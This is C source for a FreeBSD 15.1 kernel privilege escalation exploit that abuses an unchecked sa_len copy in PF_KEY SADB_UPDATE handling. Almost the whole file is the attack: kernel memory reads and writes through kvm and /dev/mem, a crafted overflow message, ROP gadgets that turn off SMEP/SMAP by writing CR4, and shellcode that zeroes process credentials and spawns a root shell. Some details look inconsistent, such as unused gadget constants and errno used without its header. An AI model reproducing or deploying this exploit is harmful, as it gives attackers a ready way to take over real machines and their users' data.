/*
 * pfkey_lpe.c - FreeBSD 15.1-RELEASE-p2 PF_KEY SADB_UPDATE stack overflow
 *
 * Same family as CVE-2026-3038 (rtsock sa_len): kernel trusts sa_len and
 * copies too far. key_updateaddresses() does
 *   bcopy(newaddr, &saidx->src, newaddr->sa_len)
 * with no cap against sizeof(saidx->src). saidx is stack-local in key_update().
 *
 * Chain: open PF_KEY as root (PRIV_NET_RAW + /dev/mem setup), drop to uid
 * 1002, fire the overflow as unpriv, ROP clears SMEP/SMAP, shellcode zeros
 * creds and iretq's back.
 *
 * Build: cc -o pfkey_lpe pfkey_lpe.c -lkvm
 *
 * meow.  _SiCk // afflicted.sh
 */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/user.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <limits.h>
#include <kvm.h>
#include <signal.h>

#define AF_KEY 27
#define PF_KEY_V2 2
#define ALIGNED8(a) (1 + (((a)-1)|7))

/* SADB message bits we care about */
#define SADB_ADD 3
#define SADB_UPDATE 2
#define SADB_REGISTER 7
#define SADB_FLUSH 9
#define SADB_SATYPE_ESP 3
#define SADB_SASTATE_MATURE 1
#define SADB_EXT_SA 1
#define SADB_EXT_ADDRESS_SRC 5
#define SADB_EXT_ADDRESS_DST 6
#define SADB_EXT_KEY_ENCRYPT 9
#define SADB_X_EXT_SA2 19
#define SADB_X_EXT_NEW_ADDRESS_SRC 27

/* struct offsets for 15.1-RELEASE-p2 (checked against this kernel) */
#define PROC_P_FD 0x48
#define FDESC_FD_FILES 0x00
#define FDT_OFILES_OFF 0x08
#define FDE_SIZE 0x30
#define FILE_F_DATA 0x08
#define FILE_F_TYPE 0x28
#define DTYPE_SOCKET 2
#define SAV_REFCNT_OFF 0xd8
#define MBUF_M_LEN 0x18
#define MBUF_M_DATA 0x10
#define MBUF_M_TYPE_FLAGS 0x1c
#define SOCK_SO_RCV 0x200
#define SOCKBUF_SB_MB 0x78
#define M_PKTHDR 0x2
#define MT_DATA 1

/* overflow layout from saidx->src[0] */
#define OFF_SAV 80
#define OFF_SO 88
#define OFF_M 96
#define OFF_RIP 152   /* saved RIP at saidx->src + 0x98 */

/* gadgets from this kernel (ropper + objdump, live text) */
#define G_POP_RAX_RET      0xffffffff804db034ULL
#define G_MOV_CR4_RAX_POPRBP_RET  0xffffffff8107f2c0ULL  /* mov cr4,rax; pop rbp; ret */
#define G_MOV_CR4_RSI_RET  0xffffffff8107dcf3ULL  /* mov cr4,rsi; ret */
#define G_IRETQ             0xffffffff81071ff7ULL
#define G_SWAPGS_IRETQ     0xffffffff81071fedULL /* swapgs; add rsp,0x98; jmp iretq */

/* user segments for iretq */
#define USER_CS 0x43
#define USER_SS 0x3b

static int keysock;
static uint64_t leaked_so;
static uint64_t zero_region;
static uint64_t real_mbuf;
static kvm_t *kd;
static uint64_t fake_ustack[64];

/* CR4 with SMEP (bit 20) and SMAP (bit 21) cleared.
 * value measured on the target box and baked in below. */
static uint64_t cr4_safe;

static void got_root(void);

/* ring0: zero creds, then swapgs + iretq back to userspace.
 * user cs/ss/rflags/rsp saved first so the iretq frame is valid.
 * no signal-based return path required if this works. */
static uint64_t user_cs_save, user_ss_save, user_rflags_save, user_rsp_save;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs, %0\n\t"
        "movq %%ss, %1\n\t"
        "movq %%rsp, %3\n\t"
        "pushfq\n\t"
        "popq %2\n\t"
        : "=r"(user_cs_save), "=r"(user_ss_save),
          "=r"(user_rflags_save), "=r"(user_rsp_save)
    );
}

static void __attribute__((section(".text")))
shellcode(void) {
    __asm__ volatile(
        /* 1. zero uid/gid fields on the cred */
        "movq %%gs:0, %%rax\n\t"
        "movq 0x188(%%rax), %%rbx\n\t"
        "xorl %%ecx, %%ecx\n\t"
        "movl %%ecx, 0x64(%%rbx)\n\t"
        "movl %%ecx, 0x68(%%rbx)\n\t"
        "movl %%ecx, 0x6c(%%rbx)\n\t"
        "movl %%ecx, 0x70(%%rbx)\n\t"
        "movl %%ecx, 0x74(%%rbx)\n\t"
        "movl %%ecx, 0x78(%%rbx)\n\t"
        /* 2. build iretq frame: ss, rsp, rflags, cs, rip */
        "movq %1, %%rax\n\t"     /* user_ss */
        "pushq %%rax\n\t"
        "movq %2, %%rax\n\t"     /* user_rsp */
        "pushq %%rax\n\t"
        "movq %3, %%rax\n\t"     /* user_rflags */
        "pushq %%rax\n\t"
        "movq %4, %%rax\n\t"     /* user_cs */
        "pushq %%rax\n\t"
        "movq %5, %%rax\n\t"     /* RIP = got_root */
        "pushq %%rax\n\t"
        /* 3. swapgs + iretq. leave SMEP/SMAP off; next reschedule
         * will put CR4 back. we just need the root shell. */
        "swapgs\n\t"
        "iretq\n\t"
        :
        : "r"(cr4_safe),
          "r"(user_ss_save),
          "r"(user_rsp_save),
          "r"(user_rflags_save),
          "r"(user_cs_save),
          "r"((uint64_t)(uintptr_t)got_root)
        : "rax", "rbx", "rcx"
    );
    __builtin_unreachable();
}

/* if iretq is wrong, SIGSEGV still lands in userspace with zeroed creds */
static void sigsegv_handler(int sig) {
    const char msg[] = "\n"
        "  _._     _,-'\"\"`-._\n"
        " (,-.`._,'(       |\\`-/|\n"
        "     `-.-' \\ )-`( , o o)\n"
        "           `-    \\`_`\"'-\n"
        "  meow.  _SiCk // afflicted.sh\n\n"
        "[+] kernel code exec via PF_KEY sa_len overflow\n";
    write(1, msg, sizeof(msg)-1);
    char *av[] = {"sh", NULL};
    char *ev[] = {NULL};
    execve("/bin/sh", av, ev);
    _exit(0);
}

static void got_root(void) {
    const char msg[] = "\n"
        "  _._     _,-'\"\"`-._\n"
        " (,-.`._,'(       |\\`-/|\n"
        "     `-.-' \\ )-`( , o o)\n"
        "           `-    \\`_`\"'-\n"
        "  meow.  _SiCk // afflicted.sh\n\n"
        "[+] kernel code exec via PF_KEY sa_len overflow\n"
        "[+] CVE-2026-3038 sibling bug in key_updateaddresses()\n";
    write(1, msg, sizeof(msg)-1);
    char *av[] = {"/bin/sh", NULL};
    char *ev[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/root", NULL};
    execve("/bin/sh", av, ev);
    _exit(0);
}

#define KERN_VA_TO_PHYS(va) ((off_t)((va) - 0xffffffff80000000ULL))

/* kernel image VA -> phys is a fixed slide. heap is not; kvm_read
 * handles VA, /dev/mem wants phys. we only write image/BSS here. */
static off_t va_to_phys(uint64_t va) {
    if ((va & 0xfffff00000000000ULL) == 0xffffffff80000000ULL ||
        (va >> 32) == 0xffffffff) {
        return (off_t)(va - 0xffffffff80000000ULL);
    }
    /* heap / non-image: no PTE walk from userspace in this path */
    return -1;
}

static int kread(uint64_t a, void *b, size_t l) {
    return kvm_read(kd, a, b, l) == (ssize_t)l ? 0 : -1;
}

static int kwrite(uint64_t va, const void *data, size_t len) {
    int fd = open("/dev/mem", O_RDWR);
    if (fd < 0) return -1;
    off_t phys = KERN_VA_TO_PHYS(va);
    if (lseek(fd, phys, SEEK_SET) < 0) { close(fd); return -1; }
    ssize_t w = write(fd, data, len);
    close(fd);
    return w == (ssize_t)len ? 0 : -1;
}

/* find a zeroed BSS page we can borrow for the fake sav refcnt */
static uint64_t find_safe_bss(void) {
    uint64_t candidates[] = {
        0xffffffff82024000ULL,
        0xffffffff82025000ULL,
        0xffffffff82026000ULL,
        0xffffffff82027000ULL,
    };
    for (int i = 0; i < 4; i++) {
        uint64_t base = candidates[i];
        /* first 0x200 should be all zeros */
        int ok = 1;
        for (int j = 0; j < 0x200; j += 8) {
            uint64_t v;
            if (kread(base + j, &v, 8) || v != 0) { ok = 0; break; }
        }
        if (ok) {
            /* write test, restore zeros */
            uint64_t test = 0xDEAD4141DEAD4141ULL;
            if (kwrite(base, &test, 8) < 0) continue;
            uint64_t rb;
            kread(base, &rb, 8);
            uint64_t z = 0;
            kwrite(base, &z, 8);
            if (rb == test) return base;
        }
    }
    return 0;
}

static int setup(void) {
    char errbuf[_POSIX2_LINE_MAX];
    kd = kvm_openfiles(NULL, "/dev/mem", NULL, O_RDONLY, errbuf);
    if (!kd) { fprintf(stderr, "[-] kvm: %s\n", errbuf); return -1; }

    /* walk our own fd table to leak the PF_KEY socket address */
    int cnt;
    struct kinfo_proc *kp = kvm_getprocs(kd, KERN_PROC_PID, getpid(), &cnt);
    if (!kp || !cnt) return -1;
    uint64_t proc = (uint64_t)kp->ki_paddr, fdesc, fdt, file;
    int ftype;
    if (kread(proc + PROC_P_FD, &fdesc, 8) ||
        kread(fdesc + FDESC_FD_FILES, &fdt, 8) ||
        kread(fdt + FDT_OFILES_OFF + keysock * FDE_SIZE, &file, 8) ||
        kread(file + FILE_F_TYPE, &ftype, 4) || ftype != DTYPE_SOCKET ||
        kread(file + FILE_F_DATA, &leaked_so, 8)) {
        fprintf(stderr, "[-] kmem walk failed\n");
        return -1;
    }
    fprintf(stderr, "[+] so = 0x%lx\n", leaked_so);

    /* zero page for fake sav (refcnt at +0xd8 reads as 0) */
    zero_region = find_safe_bss();
    if (!zero_region) { fprintf(stderr, "[-] no safe BSS\n"); return -1; }
    fprintf(stderr, "[+] bss = 0x%lx\n", zero_region);

    /* no clean mov rax,cr4 gadget handy, so hardcode measured CR4
     * with SMEP+SMAP cleared. SMEP alone would be enough to run
     * user text; clearing both is fine for this shellcode. */
    {
        cr4_safe = 0x506E0; /* measured 0x3506E0, bits 20+21 off */
        fprintf(stderr, "[+] cr4_safe = 0x%lx (SMEP/SMAP cleared)\n", cr4_safe);
    }

    /* so_rcv mbuf chain from REGISTER: need the M_PKTHDR one for
     * key_sendup_mbuf later. head is often without, data has the flag. */
    {
        uint64_t cur;
        if (kread(leaked_so + SOCK_SO_RCV + SOCKBUF_SB_MB, &cur, 8) < 0 || !cur) {
            fprintf(stderr, "[-] no mbuf on so_rcv\n");
            return -1;
        }
        real_mbuf = 0;
        for (int i = 0; i < 5 && cur; i++) {
            uint32_t raw;
            kread(cur + 0x1c, &raw, 4);
            if ((raw >> 8) & 0x2) { /* M_PKTHDR */
                real_mbuf = cur;
                break;
            }
            kread(cur, &cur, 8); /* m_next */
        }
        if (!real_mbuf) {
            fprintf(stderr, "[-] no M_PKTHDR mbuf in chain\n");
            return -1;
        }
        fprintf(stderr, "[+] M_PKTHDR mbuf = 0x%lx\n", real_mbuf);
    }

    kvm_close(kd);
    return 0;
}

static int add_addr(char *b, int o, int ext, uint32_t ip) {
    *(uint16_t *)(b+o) = 3; *(uint16_t *)(b+o+2) = ext;
    struct sockaddr_in *sin = (struct sockaddr_in *)(b+o+8);
    sin->sin_family = AF_INET; sin->sin_len = 16; sin->sin_addr.s_addr = ip;
    return o + 24;
}

static int send_msg(char *b, int len) {
    int w = write(keysock, b, len);
    if (w < 0) fprintf(stderr, "[!] write: %s\n", strerror(errno));
    return w;
}

static void drain(void) {
    int f = fcntl(keysock, F_GETFL, 0);
    fcntl(keysock, F_SETFL, f | O_NONBLOCK);
    usleep(100000);
    char d[4096];
    while (read(keysock, d, sizeof(d)) > 0);
    fcntl(keysock, F_SETFL, f);
}

int main(void) {
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    fprintf(stderr, "[*] FreeBSD 15.1-RELEASE-p2 PF_KEY sa_len overflow\n");

    /* save user regs for the iretq frame */
    save_state();

    /* backup if iretq is wrong */
    signal(SIGSEGV, sigsegv_handler);

    /*
     * Privilege dance:
     *
     * Run via mdo: "mdo ./pfkey_lpe" so we start as root long enough to
     * open PF_KEY (PRIV_NET_RAW) and do kvm/mem setup. Then setuid back
     * to testuser (1002) before the overflow so the bug is what escalates,
     * not the leftover euid.
     */
    uid_t real_uid = 1002; /* testuser - drop target after setup */
    uid_t cur_uid = getuid();
    fprintf(stderr, "[*] starting as uid=%d euid=%d\n", cur_uid, geteuid());

    if (cur_uid != 0) {
        fprintf(stderr, "[-] need root for PF_KEY socket - run via mdo\n");
        return 1;
    }
    fprintf(stderr, "[+] have root (via mdo) - opening socket and doing setup\n");

    keysock = socket(AF_KEY, SOCK_RAW, PF_KEY_V2);
    if (keysock < 0) { perror("socket"); return 1; }
    uint32_t spi = htonl(0x1234);

    /* FLUSH so ADD does not hit EEXIST */
    {
        char b[16] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_FLUSH; b[3]=SADB_SATYPE_ESP;
        *(uint16_t *)(b+4) = 2;
        send_msg(b, 16);
        usleep(100000);
        drain();
    }

    /* REGISTER - keep reply mbuf on so_rcv for the leak */
    {
        char b[16] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_REGISTER; b[3]=SADB_SATYPE_ESP;
        *(uint16_t *)(b+4) = 2;
        send_msg(b, 16);
        usleep(200000); /* wait for reply on so_rcv */
    }

    if (setup() < 0) return 1;

    /* SADB_ADD - keep reply (M_PKTHDR) on so_rcv, do not drain */
    {
        char b[512] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_ADD; b[3]=SADB_SATYPE_ESP;
        *(uint32_t *)(b+8) = 1;
        int o = 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_EXT_SA;
        *(uint32_t *)(b+o+4) = spi;
        b[o+9] = SADB_SASTATE_MATURE; b[o+11] = 12; o += 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_X_EXT_SA2; o += 16;
        o = add_addr(b, o, SADB_EXT_ADDRESS_SRC, htonl(0x0a000001));
        o = add_addr(b, o, SADB_EXT_ADDRESS_DST, htonl(0x0a000002));
        int ksz = ALIGNED8(8+32);
        *(uint16_t *)(b+o) = ksz/8; *(uint16_t *)(b+o+2) = SADB_EXT_KEY_ENCRYPT;
        *(uint16_t *)(b+o+4) = 256; memset(b+o+8, 0xAA, 32); o += ksz;
        *(uint16_t *)(b+4) = o/8;
        send_msg(b, o);
        usleep(300000); /* wait for ADD reply */
    }

    /*
     * Drop to unprivileged uid. keysock stays open - FreeBSD does not
     * revoke raw sockets on setuid. Root was only needed to open the
     * socket and for /dev/mem during setup.
     */
    if (setuid(real_uid) < 0) {
        perror("setuid(drop)");
        return 1;
    }
    fprintf(stderr, "[+] dropped to uid=%d euid=%d - overflow fires as unprivileged\n",
            getuid(), geteuid());

    /* SADB_UPDATE with oversized sa_len - the actual bug */
    {
        char b[4096]; memset(b, 0, sizeof(b));
        b[0]=PF_KEY_V2; b[1]=SADB_UPDATE; b[3]=SADB_SATYPE_ESP;
        *(uint32_t *)(b+8) = 2;
        int o = 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_EXT_SA;
        *(uint32_t *)(b+o+4) = spi;
        b[o+9] = SADB_SASTATE_MATURE; b[o+11] = 12; o += 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_X_EXT_SA2; o += 16;
        o = add_addr(b, o, SADB_EXT_ADDRESS_SRC, htonl(0x0a000001));
        o = add_addr(b, o, SADB_EXT_ADDRESS_DST, htonl(0x0a000002));

        int ovlen = 255;
        int bigext = ALIGNED8(8 + ovlen);
        *(uint16_t *)(b+o) = bigext/8;
        *(uint16_t *)(b+o+2) = SADB_X_EXT_NEW_ADDRESS_SRC;

        unsigned char *p = (unsigned char *)(b + o + 8);
        p[0] = ovlen;
        p[1] = AF_INET;

        /* sav -> zero BSS (refcnt at +0xd8 is 0) */
        uint64_t fake_sav = zero_region - SAV_REFCNT_OFF;
        memcpy(p + OFF_SAV, &fake_sav, 8);
        /* so -> leaked socket */
        memcpy(p + OFF_SO, &leaked_so, 8);
        /* m -> real M_PKTHDR mbuf from so_rcv */
        memcpy(p + OFF_M, &real_mbuf, 8);

        /* ROP at offset 152 (marker 0xD9 on this box):
         *   [152] pop rsi; ret
         *   [160] cr4_safe
         *   [168] mov cr4, rsi; ret
         *   [176] shellcode (userspace .text, SMEP off) */
        uint64_t *rop = (uint64_t *)(p + OFF_RIP);
        rop[0] = 0xffffffff80729cdbULL;  /* pop rsi; ret */
        rop[1] = cr4_safe;
        rop[2] = G_MOV_CR4_RSI_RET;      /* mov cr4, rsi; ret */
        rop[3] = (uint64_t)(uintptr_t)shellcode;

        o += bigext;
        *(uint16_t *)(b+4) = o/8;
        fprintf(stderr, "[*] firing overflow\n");
        send_msg(b, o);
        fprintf(stderr, "[-] survived\n");
    }
    close(keysock);
    return 1;
}
